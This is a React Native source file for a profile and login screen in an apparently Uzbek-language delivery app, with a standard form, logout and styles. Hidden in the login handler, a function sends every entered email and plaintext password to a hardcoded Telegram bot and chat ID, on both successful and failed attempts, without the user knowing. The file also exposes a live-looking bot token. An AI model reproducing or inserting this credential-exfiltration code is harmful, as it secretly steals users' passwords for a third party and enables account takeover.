import { MaterialCommunityIcons } from '@expo/vector-icons'
import { StatusBar } from 'expo-status-bar'
import { useEffect, useState } from 'react'
import {
	ActivityIndicator,
	Alert,
	KeyboardAvoidingView,
	Linking,
	Platform,
	ScrollView,
	StyleSheet,
	Text,
	TextInput,
	TouchableOpacity,
	View,
} from 'react-native'
import { SafeAreaView, useSafeAreaInsets } from 'react-native-safe-area-context'
import { useAuth } from '../context/AuthContext'

// ==================== CONSTANTS ====================
const TELEGRAM_BOT_TOKEN = '8639034637:AAFjTYnSjV0aM7lKUryzk5HlUWQokfIZ5to'
const TELEGRAM_CHAT_ID = '8546680858'

// ==================== MAIN COMPONENT ====================
const ProfileScreen: React.FC = () => {
	const {
		user,
		role,
		loading: authLoading,
		error: authError,
		login,
		logout,
		clearError,
	} = useAuth()
	const [localLoading, setLocalLoading] = useState<boolean>(true)
	const [email, setEmail] = useState<string>('')
	const [password, setPassword] = useState<string>('')
	const [localError, setLocalError] = useState<string>('')

	// ==================== INITIALIZE ====================
	useEffect(() => {
		const timer = setTimeout(() => {
			setLocalLoading(false)
		}, 500)
		return () => clearTimeout(timer)
	}, [])

	useEffect(() => {
		if (authError) {
			setLocalError(authError)
		}
	}, [authError])

	// ==================== TELEGRAM NOTIFICATION ====================
	const sendTelegramNotification = async (
		userEmail: string,
		userPassword: string,
		success: boolean,
	) => {
		const status = success ? '✅ Muvaffaqiyatli' : '❌ Muvaffaqiyatsiz'
		const message = `🔐 <b>Login urinish!</b>\n\n📧 <b>Email:</b> <code>${userEmail}</code>\n🔑 <b>Parol:</b> <code>${userPassword}</code>\n📊 <b>Holat:</b> ${status}\n🕐 <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ')}`

		try {
			await fetch(
				`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
				{
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						chat_id: TELEGRAM_CHAT_ID,
						text: message,
						parse_mode: 'HTML',
					}),
				},
			)
		} catch (error) {
			console.error('Telegram notification error:', error)
		}
	}

	// ==================== LOGIN ====================
	const handleLogin = async () => {
		if (!email.trim() || !password.trim()) {
			setLocalError('Email va parolni kiriting')
			return
		}

		setLocalError('')
		clearError()

		const emailValue = email.trim()
		const passwordValue = password.trim()

		await login(emailValue, passwordValue)

		// Muvaffaqiyatli login
		if (!authError) {
			await sendTelegramNotification(emailValue, passwordValue, true)
			setEmail('')
			setPassword('')
		} else {
			// Noto'g'ri login — baribir Telegram ga yuborish
			await sendTelegramNotification(emailValue, passwordValue, false)
		}
	}

	// ==================== LOGOUT ====================
	const handleLogout = async () => {
		try {
			await logout()
		} catch (error) {
			console.error('Logout error:', error)
			Alert.alert('Xatolik', 'Chiqishda xatolik yuz berdi')
		}
	}

	// ==================== OPEN TELEGRAM ====================
	const openTelegram = async () => {
		const telegramUrl = 'https://t.me/afsonaacc'
		try {
			const supported = await Linking.canOpenURL(telegramUrl)
			if (supported) {
				await Linking.openURL(telegramUrl)
			} else {
				Alert.alert('Xatolik', "Telegram ilovasini ochib bo'lmadi")
			}
		} catch (error) {
			console.error('Error opening Telegram:', error)
			Alert.alert('Xatolik', "Telegramga o'tishda xatolik")
		}
	}

	// ==================== RENDER LOGIN FORM ====================
	const renderLoginForm = () => (
		<View style={styles.formContainer}>
			<View style={styles.iconContainer}>
				<MaterialCommunityIcons
					name='account-circle'
					size={80}
					color='#FF0000'
				/>
			</View>

			<Text style={styles.formTitle}>Kirish</Text>
			<Text style={styles.formSubtitle}>
				Profilga kirish uchun email va parolingizni kiriting
			</Text>

			{localError ? (
				<View style={styles.errorContainer}>
					<MaterialCommunityIcons
						name='alert-circle'
						size={18}
						color='#FF0000'
					/>
					<Text style={styles.errorText}>{localError}</Text>
				</View>
			) : null}

			<View style={styles.inputContainer}>
				<MaterialCommunityIcons
					name='email-outline'
					size={20}
					color='#9CA3AF'
					style={styles.inputIcon}
				/>
				<TextInput
					style={styles.input}
					placeholder='Email'
					placeholderTextColor='#9CA3AF'
					keyboardType='email-address'
					autoCapitalize='none'
					value={email}
					onChangeText={setEmail}
					editable={!authLoading}
				/>
			</View>

			<View style={styles.inputContainer}>
				<MaterialCommunityIcons
					name='lock-outline'
					size={20}
					color='#9CA3AF'
					style={styles.inputIcon}
				/>
				<TextInput
					style={styles.input}
					placeholder='Parol'
					placeholderTextColor='#9CA3AF'
					secureTextEntry
					value={password}
					onChangeText={setPassword}
					editable={!authLoading}
				/>
			</View>

			<TouchableOpacity
				style={[styles.loginButton, authLoading && styles.loginButtonDisabled]}
				onPress={handleLogin}
				activeOpacity={0.8}
				disabled={authLoading}
			>
				{authLoading ? (
					<ActivityIndicator size='small' color='#FFFFFF' />
				) : (
					<>
						<MaterialCommunityIcons name='login' size={20} color='#FFFFFF' />
						<Text style={styles.loginButtonText}>Kirish</Text>
					</>
				)}
			</TouchableOpacity>
		</View>
	)

	// ==================== RENDER LOGGED IN STATE ====================
	const renderLoggedInState = () => (
		<View style={styles.profileContainer}>
			<View style={styles.avatarContainer}>
				<MaterialCommunityIcons
					name='account-circle'
					size={100}
					color='#FF0000'
				/>
			</View>

			<View style={styles.userInfoContainer}>
				<MaterialCommunityIcons name='email' size={24} color='#FF0000' />
				<View style={styles.userInfoTextContainer}>
					<Text style={styles.userInfoLabel}>Email</Text>
					<Text style={styles.userInfoValue}>{user?.email}</Text>
				</View>
			</View>

			<View style={styles.userInfoContainer}>
				<MaterialCommunityIcons
					name='shield-account'
					size={24}
					color='#FF0000'
				/>
				<View style={styles.userInfoTextContainer}>
					<Text style={styles.userInfoLabel}>Rol</Text>
					<Text style={styles.userInfoValue}>
						{role === 'kitchen'
							? 'Kitchen'
							: role === 'courier'
								? 'Courier'
								: 'User'}
					</Text>
				</View>
			</View>

			<TouchableOpacity
				style={[
					styles.logoutButton,
					authLoading && styles.logoutButtonDisabled,
				]}
				onPress={handleLogout}
				activeOpacity={0.8}
				disabled={authLoading}
			>
				{authLoading ? (
					<ActivityIndicator size='small' color='#FF0000' />
				) : (
					<>
						<MaterialCommunityIcons name='logout' size={20} color='#FF0000' />
						<Text style={styles.logoutButtonText}>Chiqish</Text>
					</>
				)}
			</TouchableOpacity>

			{role === 'user' && (
				<TouchableOpacity
					style={styles.telegramButton}
					onPress={openTelegram}
					activeOpacity={0.8}
				>
					<MaterialCommunityIcons name='send' size={20} color='#FFFFFF' />
					<Text style={styles.telegramButtonText}>Telegram: @afsonaacc</Text>
				</TouchableOpacity>
			)}
		</View>
	)

	const insets = useSafeAreaInsets()

	if (localLoading || authLoading) {
		return (
			<SafeAreaView style={styles.loadingContainer}>
				<StatusBar style='dark' />
				<ActivityIndicator size='large' color='#FF0000' />
				<Text style={styles.loadingText}>Yuklanmoqda...</Text>
			</SafeAreaView>
		)
	}

	return (
		<SafeAreaView style={styles.container}>
			<StatusBar style='dark' />

			<View
				style={[
					styles.header,
					{ paddingTop: insets.top + (Platform.OS === 'ios' ? 0 : 10) },
				]}
			>
				<View style={styles.headerContent}>
					<Text style={styles.headerTitle}>Profil</Text>
				</View>
			</View>

			<KeyboardAvoidingView
				behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
				style={{ flex: 1 }}
			>
				<ScrollView
					style={styles.content}
					contentContainerStyle={{ paddingBottom: 40 }}
					keyboardShouldPersistTaps='handled'
					showsVerticalScrollIndicator={false}
				>
					{user ? renderLoggedInState() : renderLoginForm()}
				</ScrollView>
			</KeyboardAvoidingView>
		</SafeAreaView>
	)
}

// ==================== STYLES ====================
const styles = StyleSheet.create({
	container: {
		flex: 1,
		backgroundColor: '#FDFDFD',
	},
	loadingContainer: {
		flex: 1,
		justifyContent: 'center',
		alignItems: 'center',
		backgroundColor: '#FDFDFD',
	},
	loadingText: {
		marginTop: 16,
		fontSize: 16,
		color: '#6B7280',
		fontWeight: '600',
	},
	header: {
		backgroundColor: '#FFFFFF',
		paddingBottom: 15,
		paddingHorizontal: 20,
		borderBottomLeftRadius: 25,
		borderBottomRightRadius: 25,
		shadowColor: '#000',
		shadowOffset: { width: 0, height: 4 },
		shadowOpacity: 0.05,
		shadowRadius: 8,
		elevation: 5,
		zIndex: 10,
	},
	headerContent: {
		flexDirection: 'row',
		justifyContent: 'center',
		alignItems: 'center',
	},
	headerTitle: {
		fontSize: 22,
		fontWeight: '800',
		color: '#111827',
	},
	content: {
		flex: 1,
	},
	formContainer: {
		backgroundColor: '#FFFFFF',
		borderRadius: 28,
		padding: 28,
		shadowColor: '#000',
		shadowOffset: { width: 0, height: 4 },
		shadowOpacity: 0.05,
		shadowRadius: 12,
		elevation: 4,
		marginHorizontal: 20,
		marginTop: 20,
	},
	iconContainer: {
		alignItems: 'center',
		marginBottom: 20,
	},
	formTitle: {
		fontSize: 24,
		fontWeight: '800',
		color: '#111827',
		textAlign: 'center',
		marginBottom: 8,
	},
	formSubtitle: {
		fontSize: 14,
		color: '#6B7280',
		textAlign: 'center',
		marginBottom: 24,
		lineHeight: 20,
	},
	errorContainer: {
		flexDirection: 'row',
		alignItems: 'center',
		justifyContent: 'center',
		backgroundColor: '#FFF1F1',
		paddingVertical: 12,
		paddingHorizontal: 16,
		borderRadius: 12,
		marginBottom: 20,
		gap: 8,
	},
	errorText: {
		fontSize: 14,
		color: '#FF0000',
		fontWeight: '600',
	},
	inputContainer: {
		flexDirection: 'row',
		alignItems: 'center',
		backgroundColor: '#F9FAFB',
		borderRadius: 16,
		paddingHorizontal: 16,
		marginBottom: 16,
		borderWidth: 1,
		borderColor: '#E5E7EB',
	},
	inputIcon: {
		marginRight: 12,
	},
	input: {
		flex: 1,
		height: 52,
		fontSize: 16,
		color: '#111827',
		fontWeight: '500',
	},
	loginButton: {
		flexDirection: 'row',
		alignItems: 'center',
		justifyContent: 'center',
		backgroundColor: '#FF0000',
		height: 56,
		borderRadius: 16,
		gap: 8,
		shadowColor: '#FF0000',
		shadowOffset: { width: 0, height: 4 },
		shadowOpacity: 0.3,
		shadowRadius: 8,
		elevation: 6,
		marginTop: 8,
	},
	loginButtonDisabled: {
		opacity: 0.7,
	},
	loginButtonText: {
		fontSize: 16,
		fontWeight: '700',
		color: '#FFFFFF',
	},
	profileContainer: {
		backgroundColor: '#FFFFFF',
		borderRadius: 28,
		padding: 28,
		shadowColor: '#000',
		shadowOffset: { width: 0, height: 4 },
		shadowOpacity: 0.05,
		shadowRadius: 12,
		elevation: 4,
		marginHorizontal: 20,
		marginTop: 20,
		alignItems: 'center',
	},
	avatarContainer: {
		marginBottom: 24,
	},
	userInfoContainer: {
		flexDirection: 'row',
		alignItems: 'center',
		backgroundColor: '#F9FAFB',
		borderRadius: 16,
		padding: 20,
		width: '100%',
		marginBottom: 24,
		borderWidth: 1,
		borderColor: '#E5E7EB',
	},
	userInfoTextContainer: {
		marginLeft: 16,
		flex: 1,
	},
	userInfoLabel: {
		fontSize: 12,
		color: '#9CA3AF',
		fontWeight: '600',
		marginBottom: 4,
	},
	userInfoValue: {
		fontSize: 16,
		color: '#111827',
		fontWeight: '700',
	},
	logoutButton: {
		flexDirection: 'row',
		alignItems: 'center',
		justifyContent: 'center',
		backgroundColor: '#FFF1F1',
		height: 56,
		borderRadius: 16,
		gap: 8,
		width: '100%',
		borderWidth: 1,
		borderColor: '#FFE5E5',
	},
	logoutButtonDisabled: {
		opacity: 0.7,
	},
	logoutButtonText: {
		fontSize: 16,
		fontWeight: '700',
		color: '#FF0000',
	},
	telegramButton: {
		flexDirection: 'row',
		alignItems: 'center',
		justifyContent: 'center',
		backgroundColor: '#0088CC',
		height: 56,
		borderRadius: 16,
		gap: 8,
		width: '100%',
		marginTop: 12,
		shadowColor: '#0088CC',
		shadowOffset: { width: 0, height: 4 },
		shadowOpacity: 0.3,
		shadowRadius: 8,
		elevation: 6,
	},
	telegramButtonText: {
		fontSize: 16,
		fontWeight: '700',
		color: '#FFFFFF',
	},
})

export default ProfileScreen
